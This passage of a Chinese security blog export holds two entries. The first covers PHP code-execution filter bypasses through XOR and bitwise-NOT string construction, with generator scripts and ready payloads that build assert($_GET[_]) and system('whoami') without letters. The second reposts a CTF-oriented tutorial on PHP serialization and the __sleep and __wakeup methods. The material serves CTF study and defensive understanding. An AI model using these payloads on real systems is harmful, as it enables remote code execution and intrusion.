                j <span class="token operator">=</span> <span class="token string">'%{:0>2}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"('{0}'^'{1}')"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">"."</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">break</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>一次代码执行只能得到我们想要执行语句的字符串，并不能执行语句，所以需要执行两次代码执行，构造</p>
<pre class="line-numbers language-bash"><code class="language-bash">assert<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>使用脚本对每个字母进行转换，然后拼接</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'%01'</span><span class="token operator">^</span><span class="token string">'%60'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%08'</span><span class="token operator">^</span><span class="token string">'%7b'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%08'</span><span class="token operator">^</span><span class="token string">'%7b'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%05'</span><span class="token operator">^</span><span class="token string">'%60'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%09'</span><span class="token operator">^</span><span class="token string">'%7b'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%08'</span><span class="token operator">^</span><span class="token string">'%7c'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//$_='assert';</span>
<span class="token variable">$__</span><span class="token operator">=</span><span class="token string">'_'</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%07'</span><span class="token operator">^</span><span class="token string">'%40'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%05'</span><span class="token operator">^</span><span class="token string">'%40'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%09'</span><span class="token operator">^</span><span class="token string">'%5d'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//$__='_GET';</span>
<span class="token variable">$___</span><span class="token operator">=</span>$<span class="token variable">$__</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//$___='$_GET';</span>
<span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//assert($_GET[_]);</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>payload</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'%01'</span>^<span class="token string">'%60'</span><span class="token punctuation">)</span>.<span class="token punctuation">(</span><span class="token string">'%08'</span>^<span class="token string">'%7b'</span><span class="token punctuation">)</span>.<span class="token punctuation">(</span><span class="token string">'%08'</span>^<span class="token string">'%7b'</span><span class="token punctuation">)</span>.<span class="token punctuation">(</span><span class="token string">'%05'</span>^<span class="token string">'%60'</span><span class="token punctuation">)</span>.<span class="token punctuation">(</span><span class="token string">'%09'</span>^<span class="token string">'%7b'</span><span class="token punctuation">)</span>.<span class="token punctuation">(</span><span class="token string">'%08'</span>^<span class="token string">'%7c'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token string">'_'</span>.<span class="token punctuation">(</span><span class="token string">'%07'</span>^<span class="token string">'%40'</span><span class="token punctuation">)</span>.<span class="token punctuation">(</span><span class="token string">'%05'</span>^<span class="token string">'%40'</span><span class="token punctuation">)</span>.<span class="token punctuation">(</span><span class="token string">'%09'</span>^<span class="token string">'%5d'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span>$<span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>_<span class="token operator">=</span>phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193208.png" alt="在这里插入图片描述"><br>经本地测试，发现这种方法可以在<code>php5</code>以及<code>php7.0.9</code>版本种使用，因为<code>assert()</code>的问题，并不是异或不能使用<br>注：<code>PHP5</code>低版本有些可能因为<code>magic_quotes_gpc</code>开启的关系导致无法利用<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193209.png" alt="在这里插入图片描述"><br>当过滤字符的范围没有那么大，或者只是过滤关键字的时候可以使用如下脚本</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
<span class="token keyword">import</span> string

char <span class="token operator">=</span> string<span class="token punctuation">.</span>printable
cmd <span class="token operator">=</span> <span class="token string">'system'</span>
tmp1<span class="token punctuation">,</span>tmp2 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span>
<span class="token keyword">for</span> res <span class="token keyword">in</span> cmd<span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> char<span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> char<span class="token punctuation">:</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">^</span>ord<span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">==</span> ord<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                tmp1 <span class="token operator">+=</span> i
                tmp2 <span class="token operator">+=</span> j
                <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"('{}'^'{}')"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>tmp1<span class="token punctuation">,</span>tmp2<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token number">1234567891011121314151617</span>
PS C<span class="token punctuation">:</span>\Users\Administrator<span class="token operator">></span> php <span class="token operator">-</span>r <span class="token string">"var_dump('000000'^'CICDU]');"</span>
Command line code<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span>
string<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token string">"system"</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193210.png" alt="在这里插入图片描述"><br>再放个网上看到的payload</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">${%ff%ff%ff%ff^%a0%b8%ba%ab}</span><span class="token punctuation">{</span>%ff<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>%ff<span class="token operator">=</span>phpinfo
//<span class="token variable">${_GET}</span><span class="token punctuation">{</span>%ff<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>%ff<span class="token operator">=</span>phpinfo
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="URL编码取反绕过"><a href="#URL编码取反绕过" class="headerlink" title="URL编码取反绕过"></a>URL编码取反绕过</h2><blockquote>
<p>适用PHP版本：无限制</p>
</blockquote>
<p>还是上面那个例题<br>当<code>PHP&gt;=7</code>时，可以直接利用取反构造payload</p>
<pre class="line-numbers language-bash"><code class="language-bash">PS C:\Users\Administrator<span class="token operator">></span> php -r <span class="token string">"var_dump(urlencode(~'phpinfo'));"</span>
Command line code:1:
string<span class="token punctuation">(</span>21<span class="token punctuation">)</span> <span class="token string">"%8F%97%8F%96%91%99%90"</span>
123
<span class="token punctuation">(</span>~%8F%97%8F%96%91%99%90<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">#phpinfo();</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193211.png" alt="在这里插入图片描述"><br>有参数的</p>
<pre class="line-numbers language-bash"><code class="language-bash">PS C:\Users\Administrator<span class="token operator">></span> php -r <span class="token string">"var_dump(urlencode(~'system'));"</span>
Command line code:1:
string<span class="token punctuation">(</span>18<span class="token punctuation">)</span> <span class="token string">"%8C%86%8C%8B%9A%92"</span>
PS C:\Users\Administrator<span class="token operator">></span> php -r <span class="token string">"var_dump(urlencode(~'whoami'));"</span>
Command line code:1:
string<span class="token punctuation">(</span>18<span class="token punctuation">)</span> <span class="token string">"%88%97%90%9E%92%96"</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>payload</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">(</span>~%8C%86%8C%8B%9A%92<span class="token punctuation">)</span><span class="token punctuation">(</span>~%88%97%90%9E%92%96<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">#system('whoami');</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193212.png" alt="在这里插入图片描述"></p>
<p>当<code>5&lt;=PHP&lt;=7.0.9</code>时，需要再执行一次构造出来的字符，所以参考上面那种<code>异或拼接</code>的方法</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span>~<span class="token string">'%9E%8C%8C%9A%8D%8B'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token string">'_'</span>.<span class="token punctuation">(</span>~<span class="token string">'%AF%B0%AC%AB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span>$<span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">#assert($_GET[_]);</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193213.png" alt="在这里插入图片描述"></p>
<hr>
<p>参考链接：</p>
<ul>
<li><a href="https://www.anquanke.com/post/id/168667">https://www.anquanke.com/post/id/168667</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a></li>
<li><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html">https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></li>
</ul>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>php代码执行</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP序列化反序列化漏洞总结（一篇懂）</title>
    <url>/phpserializezongjie.html</url>
    <content><![CDATA[<p>转自whoami大佬的文章<a href="https://blog.csdn.net/qq_45521281/article/details/105891381，写的较为详细，故保存至博客内">https://blog.csdn.net/qq_45521281/article/details/105891381，写的较为详细，故保存至博客内</a></p>
<h1 id="序列化和反序列化的概念与基础知识"><a href="#序列化和反序列化的概念与基础知识" class="headerlink" title="序列化和反序列化的概念与基础知识"></a>序列化和反序列化的概念与基础知识</h1><p><strong>序列化就是将一个对象转换成字符串。字符串包括，属性名，属性值，属性类型和该对象对应的类名。</strong><br><strong>反序列化则相反将字符串重新恢复成对象</strong></p>
<table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">过程</th>
</tr>
</thead>
<tbody><tr>
<td align="left">序列化</td>
<td align="left">对象—&gt; 字符串</td>
</tr>
<tr>
<td align="left">反序列化</td>
<td align="left">字符串—&gt;对象</td>
</tr>
</tbody></table>
<p>对象的序列化利于对象的 <strong>保存和传输</strong> ，也可以让<strong>多个文件共享对象</strong>。ctf很多题型也都是考察PHP反序列化的相关知识。</p>
<h2 id="PHP的序列化"><a href="#PHP的序列化" class="headerlink" title="PHP的序列化"></a>PHP的序列化</h2><p>序列化函数serialize()</p>
<p>首先我创一个Ctf类 里面写了三个属性 后创建了一个ctfer对象 将Ctf类里的信息进行了改变。<strong>如果后面还要用到这个对象，就可以先将这个对象进行实例化。用的时候在反序列化出来就ok了。</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name">Ctf</span><span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">'flag{****}'</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'cxk'</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string">'10'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$ctfer</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Ctf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//实例化一个对象</span>
    <span class="token variable">$ctfer</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">flag</span><span class="token operator">=</span><span class="token string">'flag{adedyui}'</span><span class="token punctuation">;</span>
    <span class="token variable">$ctfer</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token operator">=</span><span class="token string">'Sch0lar'</span><span class="token punctuation">;</span>
    <span class="token variable">$ctfer</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token operator">=</span><span class="token string">'18'</span>
    <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$ctfer</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span class="token comment" spellcheck="true">//输出结果</span>
O<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"Ctf"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"flag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token string">"flag{abedyui}"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">"Sch0lar"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"18"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
O代表对象，因为我们序列化的是一个对象；序列化数组的话则用A来表示
<span class="token number">3</span>代表类的名字长三个字符
Ctf 是类名
<span class="token number">3</span>代表这个类里有三个属性<span class="token punctuation">(</span>三个变量<span class="token punctuation">)</span>
s代表字符串
<span class="token number">4</span>代表属性名的长度
flag是属性名
s<span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token string">"flag{adedyui}"</span> 字符串，属性长度，属性值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>serialize() 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，<strong><code>__sleep()</code>方法会先被调用，然后才执行序列化操作</strong>。</p>
<p><strong>可以在<code>__sleep()</code>方法里决定哪些属性可以被序列化。如果没有__sleep()方法则默认序列化所有属性</strong></p>
<p>实例：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name">Ctf</span><span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">'flag{****}'</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'cxk'</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string">'10'</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">'age'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$ctfer</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Ctf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$ctfer</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">flag</span><span class="token operator">=</span><span class="token string">'flag{abedyui}'</span><span class="token punctuation">;</span>
    <span class="token variable">$ctfer</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token operator">=</span><span class="token string">'Sch0lar'</span><span class="token punctuation">;</span>
    <span class="token variable">$ctfer</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token operator">=</span><span class="token string">'18'</span>
    <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$ctfer</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span class="token comment" spellcheck="true">// 输出结果</span>
O<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"Ctf"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"flag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token string">"flag{abedyui}"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"18"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>即__sleep()</code>方法使 flag age 属性序列化，而name并没有被序列化。所以<strong>可以在<code>__sleep()</code>方法里决定哪些属性被序列化。</strong></p>
<h2 id="访问控制修饰符"><a href="#访问控制修饰符" class="headerlink" title="访问控制修饰符"></a>访问控制修饰符</h2><p>根据<strong>访问控制修饰符的不同</strong> 序列化后的 <strong>属性长度</strong>和<strong>属性值</strong>会有所不同，所以这里简单提一下</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">public</span><span class="token punctuation">(</span>公有<span class="token punctuation">)</span> 
<span class="token keyword">protected</span><span class="token punctuation">(</span>受保护<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">// %00*%00属性名</span>
<span class="token keyword">private</span><span class="token punctuation">(</span>私有的<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">// %00类名%00属性名</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>protected属性被序列化的时候<strong>属性值</strong>会变成<strong>%00*%00属性名</strong><br>private属性被序列化的时候<strong>属性值</strong>会变成<strong>%00类名%00属性名</strong></p>
<p><strong>（%00为空白符，空字符也有长度，一个空字符长度为 1）</strong></p>
<p>实例：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name">Ctf</span><span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'Sch0lar'</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string">'19'</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">'get flag'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$ctfer</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Ctf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//实例化一个对象</span>
    <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$ctfer</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span class="token number">123456789</span>
<span class="token comment" spellcheck="true">//输出结果</span>
O<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"Ctf"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">"Sch0lar"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"*age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"19"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string">"Ctfflag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"get flag"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到</p>
<pre class="line-numbers language-php"><code class="language-php">s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"*age"</span>   <span class="token comment" spellcheck="true">//*前后出现两个空白符，一个空白符长度为1，所以序列化后，该属性长度为6</span>
s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string">"Ctfflag"</span>   <span class="token comment" spellcheck="true">//类名Ctf前后出现两个%00空白符，所以长度为9</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="PHP的反序列化"><a href="#PHP的反序列化" class="headerlink" title="PHP的反序列化"></a>PHP的反序列化</h2><p>反序列化函数unserialize()。反序列化就是将一个序列化了的对象或数组字符串，还原回去</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name">Ctf</span><span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">'flag{****}'</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'cxk'</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string">'10'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$ctfer</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Ctf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//实例化一个对象</span>
    <span class="token variable">$ctfer</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">flag</span><span class="token operator">=</span><span class="token string">'flag{adedyui}'</span><span class="token punctuation">;</span>
    <span class="token variable">$ctfer</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token operator">=</span><span class="token string">'Sch0lar'</span><span class="token punctuation">;</span>
    <span class="token variable">$ctfer</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token operator">=</span><span class="token string">'18'</span>
    <span class="token variable">$str</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$ctfer</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>
    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token delimiter">?></span>

<span class="token comment" spellcheck="true">//输出结果</span>
<span class="token function">object</span><span class="token punctuation">(</span>Ctf<span class="token punctuation">)</span><span class="token shell-comment comment">#2 (3) {</span>
    <span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
    <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token string">"flag{abedyui}"</span>
    <span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
    <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token string">"Sch0lar"</span>
    <span class="token punctuation">[</span><span class="token string">"age"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
    <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"18"</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>与序列化函数类似，unserialize()会检查类中是否存在一个<code>__wakeup</code>魔术方法</strong><br><strong>如果存在则会先调用<code>__wakeup()</code>方法，再进行序列化</strong></p>
<p><strong>可以在<code>__wakeup()</code>方法中对属性进行初始化、赋值或者改变。</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name">Ctf</span><span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">'flag{****}'</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'cxk'</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string">'10'</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">flag</span><span class="token operator">=</span><span class="token string">'no flag'</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//在反序列化时，flag属性将被改变为“no flag”</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$ctfer</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Ctf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//实例化一个对象</span>
